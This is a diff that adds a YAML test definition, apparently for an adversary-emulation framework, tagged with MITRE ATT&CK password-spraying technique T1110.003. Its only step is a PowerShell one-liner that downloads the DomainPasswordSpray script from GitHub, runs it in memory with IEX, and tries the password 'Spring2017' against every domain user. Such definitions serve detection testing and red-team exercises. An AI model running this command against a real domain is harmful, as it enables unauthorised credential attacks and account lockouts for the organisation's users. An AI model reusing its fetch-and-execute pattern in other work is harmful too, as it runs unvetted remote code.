@@ -1,0 +1,30 @@
+api_version: "2.0"
+name: Password Spray (DomainPasswordSpray)
+description: |
+    Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain
+
+    https://github.com/dafthack/DomainPasswordSpray
+args:
+    - name: domain
+      type: string
+      default: $Env:USERDOMAIN
+uuid: 263ae743-515f-4786-ac7d-41ef3a0d4b2b
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.003: Password Spraying'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: password-spray-(domainpasswordspray)
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain {{.Args.domain}} -Force
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
